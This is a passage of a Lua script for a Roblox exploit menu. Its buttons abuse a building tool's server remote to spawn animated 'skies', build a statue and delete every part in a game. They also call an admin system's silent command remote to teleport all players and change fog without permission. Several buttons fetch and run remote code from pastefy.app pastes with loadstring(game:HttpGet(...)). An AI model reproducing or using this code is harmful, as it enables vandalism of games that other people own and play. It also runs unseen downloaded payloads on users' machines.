		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint
	local RunService = game:GetService("RunService")

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function CreatePart(cf, parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end

	function SetAnchor(part, boolean)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetTransparency(part, value)
		local args = {
			[1] = "SyncTransparency",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = value
				}
			}
		}
		_(args)
	end

	function SetVertexColor(part, vertexColor)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["VertexColor"] = vertexColor
				}
			}
		}
		_(args)
	end

	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end

	local images = {
		"http://www.roblox.com/asset/?id=100517725383259",
		"http://www.roblox.com/asset/?id=108968299114697",
		"http://www.roblox.com/asset/?id=75961396810991",
		"http://www.roblox.com/asset/?id=73153381593508",
		"http://www.roblox.com/asset/?id=110376340305303",
		"http://www.roblox.com/asset/?id=132960021309807",
		"http://www.roblox.com/asset/?id=100517725383259",
		"http://www.roblox.com/asset/?id=108968299114697"
	}

	local skyPart
	local skyLoop
	local frameTime = 0.07
	local lastUpdate = 0

	function CreateSky()
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and (v.CFrame.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 0.1 then
				skyPart = v
				SetAnchor(skyPart, true)
				AddMesh(skyPart)
				SetMesh(skyPart, "111891702759441")
				MeshResize(skyPart, Vector3.new(10000, 10000, 10000))
				SetTransparency(skyPart, 1)
				SetVertexColor(skyPart, Vector3.new(3,3,3))

				local index = 1
				skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
					lastUpdate = lastUpdate + deltaTime
					if lastUpdate >= frameTime then
						lastUpdate = 0
						if not skyPart then
							skyLoop:Disconnect()
							return
						end
						SetTransparency(skyPart, 0)
						SetTexture(skyPart, images[index])
						index = index % #images + 1
					end
				end)
			end
		end
	end

	function ResetSky()
		if skyPart then
			DestroyPart(skyPart)
			skyPart = nil
		end
		if skyLoop then
			skyLoop:Disconnect()
			skyLoop = nil
		end
		CreateSky()
	end

	player.CharacterAdded:Connect(function(newChar)
		char = newChar
		ResetSky()
	end)

	if char and char:FindFirstChild("Humanoid") then
		char:WaitForChild("Humanoid").Died:Connect(function()
			ResetSky()
		end)
	end

	CreateSky()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";time 0 ;fogcolor black")
end)
end

local TextButton25 = Instance.new("TextButton")
TextButton25.Name = "TextButton"
TextButton25.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton25.Text = "skeleton sky small"
TextButton25.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton25.TextSize = 14
TextButton25.TextWrapped = true
TextButton25.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton25.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton25.BorderSizePixel = 2
TextButton25.Position = UDim2.new(0.813359499, 0, 0.62159127, 0)
TextButton25.Size = UDim2.new(0, 74, 0, 31)
TextButton25.Parent = ScrollingFrame

local LocalScript54 = Instance.new("Folder")
LocalScript54.Name = "LocalScript"
LocalScript54.Parent = TextButton25
__S[#__S + 1] = function(...)
local script = LocalScript54
script.Parent.MouseButton1Click:Connect(function()


	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";fog 999999999")

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint
	local RunService = game:GetService("RunService")

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function CreatePart(cf, parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end

	function SetAnchor(part, boolean)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetTransparency(part, value)
		local args = {
			[1] = "SyncTransparency",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = value
				}
			}
		}
		_(args)
	end

	function SetVertexColor(part, vertexColor)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["VertexColor"] = vertexColor
				}
			}
		}
		_(args)
	end

	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end

	local images = {
		"http://www.roblox.com/asset/?id=169585459",
		"http://www.roblox.com/asset/?id=169585475",
		"http://www.roblox.com/asset/?id=169585485",
		"http://www.roblox.com/asset/?id=169585502",
		"http://www.roblox.com/asset/?id=169585515",
		"http://www.roblox.com/asset/?id=169585502",
		"http://www.roblox.com/asset/?id=169585485",
		"http://www.roblox.com/asset/?id=169585475"
	}

	local skyPart
	local skyLoop
	local frameTime = 0.15
	local lastUpdate = 0

	function CreateSky()
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and (v.CFrame.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 0.1 then
				skyPart = v
				SetAnchor(skyPart, true)
				AddMesh(skyPart)
				SetMesh(skyPart, "111891702759441")
				MeshResize(skyPart, Vector3.new(10000, 10000, 10000))
				SetTransparency(skyPart, 1)
				SetVertexColor(skyPart, Vector3.new(3,3,3))

				local index = 1
				skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
					lastUpdate = lastUpdate + deltaTime
					if lastUpdate >= frameTime then
						lastUpdate = 0
						if not skyPart then
							skyLoop:Disconnect()
							return
						end
						SetTransparency(skyPart, 0)
						SetTexture(skyPart, images[index])
						index = index % #images + 1
					end
				end)
			end
		end
	end

	function ResetSky()
		if skyPart then
			DestroyPart(skyPart)
			skyPart = nil
		end
		if skyLoop then
			skyLoop:Disconnect()
			skyLoop = nil
		end
		CreateSky()
	end

	player.CharacterAdded:Connect(function(newChar)
		char = newChar
		ResetSky()
	end)

	if char and char:FindFirstChild("Humanoid") then
		char:WaitForChild("Humanoid").Died:Connect(function()
			ResetSky()
		end)
	end

	CreateSky()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";time 0 ;fogcolor black")
end)
end

local TextButton26 = Instance.new("TextButton")
TextButton26.Name = "TextButton"
TextButton26.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton26.Text = "skeleton sky"
TextButton26.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton26.TextSize = 14
TextButton26.TextWrapped = true
TextButton26.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton26.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton26.BorderSizePixel = 2
TextButton26.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton26.Size = UDim2.new(0, 74, 0, 31)
TextButton26.Parent = ScrollingFrame

local LocalScript55 = Instance.new("Folder")
LocalScript55.Name = "LocalScript"
LocalScript55.Parent = TextButton26
__S[#__S + 1] = function(...)
local script = LocalScript55
script.Parent.MouseButton1Click:Connect(function()


	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";unfog")

	local player = game.Players.LocalPlayer
	local char = player.Character or player.CharacterAdded:Wait()
	local tool

	for i, v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	for i, v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end

	local remote = tool.SyncAPI.ServerEndpoint
	local RunService = game:GetService("RunService")

	function _(args)
		remote:InvokeServer(unpack(args))
	end

	function CreatePart(cf, parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end

	function SetAnchor(part, boolean)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end

	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part, meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://" .. meshid
				}
			}
		}
		_(args)
	end

	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = texid
				}
			}
		}
		_(args)
	end

	function MeshResize(part, size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end

	function SetTransparency(part, value)
		local args = {
			[1] = "SyncTransparency",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = value
				}
			}
		}
		_(args)
	end

	function SetVertexColor(part, vertexColor)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["VertexColor"] = vertexColor
				}
			}
		}
		_(args)
	end

	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end

	local images = {
		"http://www.roblox.com/asset/?id=169585459",
		"http://www.roblox.com/asset/?id=169585475",
		"http://www.roblox.com/asset/?id=169585485",
		"http://www.roblox.com/asset/?id=169585502",
		"http://www.roblox.com/asset/?id=169585515",
		"http://www.roblox.com/asset/?id=169585502",
		"http://www.roblox.com/asset/?id=169585485",
		"http://www.roblox.com/asset/?id=169585475"
	}

	local skyPart
	local skyLoop
	local frameTime = 0.15
	local lastUpdate = 0

	function CreateSky()
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return end

		local cf = hrp.CFrame
		CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)

		for _, v in workspace:GetDescendants() do
			if v:IsA("BasePart") and (v.CFrame.Position - (cf.Position + Vector3.new(0, 6, 0))).Magnitude < 0.1 then
				skyPart = v
				SetAnchor(skyPart, true)
				AddMesh(skyPart)
				SetMesh(skyPart, "111891702759441")
				MeshResize(skyPart, Vector3.new(99999, 99999, 99999))
				SetTransparency(skyPart, 1)
				SetVertexColor(skyPart, Vector3.new(3,3,3))

				local index = 1
				skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
					lastUpdate = lastUpdate + deltaTime
					if lastUpdate >= frameTime then
						lastUpdate = 0
						if not skyPart then
							skyLoop:Disconnect()
							return
						end
						SetTransparency(skyPart, 0)
						SetTexture(skyPart, images[index])
						index = index % #images + 1
					end
				end)
			end
		end
	end

	function ResetSky()
		if skyPart then
			DestroyPart(skyPart)
			skyPart = nil
		end
		if skyLoop then
			skyLoop:Disconnect()
			skyLoop = nil
		end
		CreateSky()
	end

	player.CharacterAdded:Connect(function(newChar)
		char = newChar
		ResetSky()
	end)

	if char and char:FindFirstChild("Humanoid") then
		char:WaitForChild("Humanoid").Died:Connect(function()
			ResetSky()
		end)
	end

	CreateSky()

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent

	RequestCommand:InvokeServer(";time 0 ;fogcolor black")
end)
end

local TextButton27 = Instance.new("TextButton")
TextButton27.Name = "TextButton"
TextButton27.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton27.Text = "polaria f3x"
TextButton27.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton27.TextSize = 14
TextButton27.TextWrapped = true
TextButton27.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton27.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton27.BorderSizePixel = 2
TextButton27.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton27.Size = UDim2.new(0, 74, 0, 31)
TextButton27.Parent = ScrollingFrame

local LocalScript56 = Instance.new("Folder")
LocalScript56.Name = "LocalScript"
LocalScript56.Parent = TextButton27
__S[#__S + 1] = function(...)
local script = LocalScript56
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/knC8ehM5/raw"))()
end)
end

local TextButton28 = Instance.new("TextButton")
TextButton28.Name = "TextButton"
TextButton28.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton28.Text = "grab knife (R6)"
TextButton28.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton28.TextSize = 14
TextButton28.TextWrapped = true
TextButton28.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton28.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton28.BorderSizePixel = 2
TextButton28.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton28.Size = UDim2.new(0, 74, 0, 31)
TextButton28.Parent = ScrollingFrame

local LocalScript57 = Instance.new("Folder")
LocalScript57.Name = "LocalScript"
LocalScript57.Parent = TextButton28
__S[#__S + 1] = function(...)
local script = LocalScript57
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/RRDmwDvX/raw"))()
end)
end

local TextButton29 = Instance.new("TextButton")
TextButton29.Name = "TextButton"
TextButton29.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton29.Text = "delete all parts"
TextButton29.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton29.TextSize = 14
TextButton29.TextWrapped = true
TextButton29.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton29.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton29.BorderSizePixel = 2
TextButton29.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton29.Size = UDim2.new(0, 74, 0, 31)
TextButton29.Parent = ScrollingFrame

local LocalScript58 = Instance.new("Folder")
LocalScript58.Name = "LocalScript"
LocalScript58.Parent = TextButton29
__S[#__S + 1] = function(...)
local script = LocalScript58
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local backpack = player.Backpack

local function getf3x()
	for _, v in ipairs(backpack:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:FindFirstChild("SyncAPI") then
			return v
		end
	end

	return nil
end

local f3x = getf3x()
if not f3x then
	warn("you dont have f3x skid")
	return
end

local syncapi = f3x.SyncAPI
local serverendpoint = syncapi.ServerEndpoint

local function deleteall()
	local removeBatch = {}

	for _, v in ipairs(workspace:GetDescendants()) do
		if (v:IsA("BasePart") or v:IsA("UnionOperation")) 
			and v.Name ~= "Sky" 
			and v.Name ~= "Skybox" 
			and v.Name ~= "Terrain" then
			
			if not v:FindFirstAncestorOfClass("Model") or not game.Players:GetPlayerFromCharacter(v:FindFirstAncestorOfClass("Model")) then
				table.insert(removeBatch, v)
			end
		end
	end

	if #removeBatch > 0 then
		serverendpoint:InvokeServer("Remove", removeBatch)
	end
end

deleteall()

end)
end

local TextButton30 = Instance.new("TextButton")
TextButton30.Name = "TextButton"
TextButton30.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton30.Text = "1sw0rd1 gui"
TextButton30.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton30.TextSize = 14
TextButton30.TextWrapped = true
TextButton30.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton30.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton30.BorderSizePixel = 2
TextButton30.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton30.Size = UDim2.new(0, 74, 0, 31)
TextButton30.Parent = ScrollingFrame

local LocalScript59 = Instance.new("Folder")
LocalScript59.Name = "LocalScript"
LocalScript59.Parent = TextButton30
__S[#__S + 1] = function(...)
local script = LocalScript59
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/dF1grPDx/raw"))()
end)
end

local TextButton31 = Instance.new("TextButton")
TextButton31.Name = "TextButton"
TextButton31.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton31.Text = "AK47"
TextButton31.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton31.TextSize = 14
TextButton31.TextWrapped = true
TextButton31.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton31.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton31.BorderSizePixel = 2
TextButton31.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton31.Size = UDim2.new(0, 74, 0, 31)
TextButton31.Parent = ScrollingFrame

local LocalScript60 = Instance.new("Folder")
LocalScript60.Name = "LocalScript"
LocalScript60.Parent = TextButton31
__S[#__S + 1] = function(...)
local script = LocalScript60
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/p4jVHqYB/raw"))()
end)
end

local TextButton32 = Instance.new("TextButton")
TextButton32.Name = "TextButton"
TextButton32.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton32.Text = "sledgehammer (R6)"
TextButton32.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton32.TextSize = 14
TextButton32.TextWrapped = true
TextButton32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton32.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton32.BorderSizePixel = 2
TextButton32.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton32.Size = UDim2.new(0, 74, 0, 31)
TextButton32.Parent = ScrollingFrame

local LocalScript61 = Instance.new("Folder")
LocalScript61.Name = "LocalScript"
LocalScript61.Parent = TextButton32
__S[#__S + 1] = function(...)
local script = LocalScript61
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/1flpHnvP/raw"))()
end)
end

local TextButton33 = Instance.new("TextButton")
TextButton33.Name = "TextButton"
TextButton33.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton33.Text = "spawn  tower"
TextButton33.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton33.TextSize = 14
TextButton33.TextWrapped = true
TextButton33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton33.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton33.BorderSizePixel = 2
TextButton33.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton33.Size = UDim2.new(0, 74, 0, 31)
TextButton33.Parent = ScrollingFrame

local LocalScript62 = Instance.new("Folder")
LocalScript62.Name = "LocalScript"
LocalScript62.Parent = TextButton33
__S[#__S + 1] = function(...)
local script = LocalScript62
script.Parent.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/oYyAXAb5/raw"))()
end)
end

local TextButton34 = Instance.new("TextButton")
TextButton34.Name = "TextButton"
TextButton34.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton34.Text = "bring all"
TextButton34.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton34.TextSize = 14
TextButton34.TextWrapped = true
TextButton34.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton34.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton34.BorderSizePixel = 2
TextButton34.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton34.Size = UDim2.new(0, 74, 0, 31)
TextButton34.Parent = ScrollingFrame

local LocalScript63 = Instance.new("Folder")
LocalScript63.Name = "LocalScript"
LocalScript63.Parent = TextButton34
__S[#__S + 1] = function(...)
local script = LocalScript63
script.Parent.MouseButton1Click:Connect(function()
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
RequestCommand:InvokeServer(";tp all me")
end)
end


end
do -- chunk 3/6
local TextButton = Instance.new("TextButton")
TextButton.Name = "TextButton"
TextButton.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton.Text = "snoppdogg sky"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14
TextButton.TextWrapped = true
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton.BorderSizePixel = 2
TextButton.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton.Size = UDim2.new(0, 74, 0, 31)
TextButton.Parent = R[226]

local LocalScript = Instance.new("Folder")
LocalScript.Name = "LocalScript"
LocalScript.Parent = TextButton
__S[#__S + 1] = function(...)
local script = LocalScript
script.Parent.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastefy.app/FGoxTHc3/raw"))()
end)
end

local TextButton2 = Instance.new("TextButton")
TextButton2.Name = "TextButton"
TextButton2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton2.Text = "snoppdogg sky small"
TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton2.TextSize = 14
TextButton2.TextWrapped = true
TextButton2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton2.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton2.BorderSizePixel = 2
TextButton2.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton2.Size = UDim2.new(0, 74, 0, 31)
TextButton2.Parent = R[226]

local LocalScript2 = Instance.new("Folder")
LocalScript2.Name = "LocalScript"
LocalScript2.Parent = TextButton2
__S[#__S + 1] = function(...)
local script = LocalScript2
script.Parent.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet("https://pastefy.app/BOdCsyaw/raw"))()
end)
end

local TextButton3 = Instance.new("TextButton")
TextButton3.Name = "TextButton"
TextButton3.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
TextButton3.Text = "TrafficConeHax statue"
TextButton3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton3.TextSize = 14
TextButton3.TextWrapped = true
TextButton3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton3.BorderColor3 = Color3.fromRGB(0, 242, 255)
TextButton3.BorderSizePixel = 2
TextButton3.Position = UDim2.new(0.66601181, 0, 0.62159127, 0)
TextButton3.Size = UDim2.new(0, 74, 0, 31)
TextButton3.Parent = R[226]

local LocalScript3 = Instance.new("Folder")
LocalScript3.Name = "LocalScript"
LocalScript3.Parent = TextButton3
__S[#__S + 1] = function(...)
local script = LocalScript3
script.Parent.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
--craaa
remote = tool.SyncAPI.ServerEndpoint
function _(args)
    remote:InvokeServer(unpack(args))
end
function SetCollision(part,boolean)
    local args = {
        [1] = "SyncCollision",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CanCollide"] = boolean
            }
        }
    }
    _(args)
end
function SetAnchor(boolean,part)
    local args = {
        [1] = "SyncAnchor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Anchored"] = boolean
            }
        }
    }
    _(args)
end
function CreatePart(cf,parent)
    local args = {
        [1] = "CreatePart",
        [2] = "Normal",
        [3] = cf,
        [4] = parent
    }
    _(args)
end
function MovePart(part,cf)
    local args = {
        [1] = "SyncMove",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf
            }
        }
    }
    _(args)
end
function Resize(part,size,cf)
    local args = {
        [1] = "SyncResize",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["CFrame"] = cf,
                ["Size"] = size
            }
        }
    }
    _(args)
end
function AddMesh(part)
    local args = {
        [1] = "CreateMeshes",
        [2] = {
            [1] = {
                ["Part"] = part
            }
        }
    }
    _(args)
end

function SetMesh(part,meshid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["MeshId"] = "rbxassetid://"..meshid
            }
        }
    }
    _(args)
end
function SetTexture(part, texid)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["TextureId"] = "rbxassetid://"..texid
            }
        }
    }
    _(args)
end
function SetName(part, stringg)
    local args = {
        [1] = "SetName",
        [2] = {
            [1] = part
        },
        [3] = stringg
    }

    _(args)
end
function MeshResize(part,size)
    local args = {
        [1] = "SyncMesh",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Scale"] = size
            }
        }
    }
    _(args)
end
function Weld(part1, part2,lead)
    local args = {
        [1] = "CreateWelds",
        [2] = {
            [1] = part1,
            [2] = part2
        },
        [3] = lead
    }
    _(args)

end
function SetLocked(part,boolean)
    local args = {
        [1] = "SetLocked",
        [2] = {
            [1] = part
        },
        [3] = boolean
    }
    _(args)
end
function SetTrans(part,int)
    local args = {
        [1] = "SyncMaterial",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Transparency"] = int
            }
        }
    }
    _(args)
end
function CreateSpotlight(part)
    local args = {
        [1] = "CreateLights",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["LightType"] = "SpotLight"
            }
        }
    }
    _(args)
end
function SyncLighting(part,brightness)
    local args = {
        [1] = "SyncLighting",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["LightType"] = "SpotLight",
                ["Brightness"] = brightness
            }
        }
    }
    _(args)
end
function Color(part,color)
    local args = {
        [1] = "SyncColor",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Color"] = color --[[Color3]],
                ["UnionColoring"] = false
            }
        }
    }
    _(args)
end
function SpawnDecal(part,side)
    local args = {
        [1] = "CreateTextures",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Face"] = side,
                ["TextureType"] = "Decal"
            }
        }
    }

    _(args)
end
function AddDecal(part,asset,side)
    local args = {
        [1] = "SyncTexture",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["Face"] = side,
                ["TextureType"] = "Decal",
                ["Texture"] = "rbxassetid://".. asset
            }
        }
    }
    _(args)
end

function Krab(mesh_id, texture_id)
    e = char.HumanoidRootPart.CFrame.x
    f = char.HumanoidRootPart.CFrame.y
    g = char.HumanoidRootPart.CFrame.z
    CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,18,0),workspace)
